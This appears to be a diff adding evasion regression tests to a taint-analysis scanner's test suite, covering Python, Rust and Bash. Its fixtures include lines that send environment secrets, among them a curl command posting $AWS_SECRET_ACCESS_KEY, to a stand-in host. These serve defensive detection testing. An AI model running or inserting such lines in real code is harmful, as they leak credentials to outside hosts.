@@ -69,4 +69,39 @@ describe("polyglot taint (Python/Bash/Rust) + JS/TS dispatch", () => {
 			) > 0,
 		);
 	});
+
+	// ── evasion regressions (previously false negatives) ──
+	test("Python: sink via any receiver (s = Session(); s.post) is flagged", () => {
+		assert.ok(
+			flows(
+				"r1.py",
+				'import os,requests\ns=requests.Session()\nk=os.getenv("K")\ns.post("http://x",data=k)\n',
+			) > 0,
+		);
+	});
+	test("Python: import alias (import requests as r; r.post) is flagged", () => {
+		assert.ok(
+			flows(
+				"r2.py",
+				'import os\nimport requests as r\nk=os.getenv("K")\nr.post("http://x",data=k)\n',
+			) > 0,
+		);
+	});
+	test("Python: dict.get is NOT a network sink (no false positive)", () => {
+		assert.equal(flows("r3.py", 'd={}\nx=d.get("k")\nprint(x)\n'), 0);
+	});
+	test("Rust: chained builder .body(secret).send() is flagged", () => {
+		assert.ok(
+			flows(
+				"r4.rs",
+				'use std::env;\nfn main(){ let s=env::var("K").unwrap(); reqwest::blocking::Client::new().post("http://x").body(s).send().unwrap(); }\n',
+			) > 0,
+		);
+	});
+	test("Bash: direct secret-named env expansion into curl is flagged", () => {
+		assert.ok(flows("r5.sh", 'curl -X POST -d "$AWS_SECRET_ACCESS_KEY" http://x\n') > 0);
+	});
+	test("Bash: benign env var ($USER_NAME) is NOT flagged (no false positive)", () => {
+		assert.equal(flows("r6.sh", 'curl -X POST -d "$USER_NAME" http://api.example.com\n'), 0);
+	});
 });
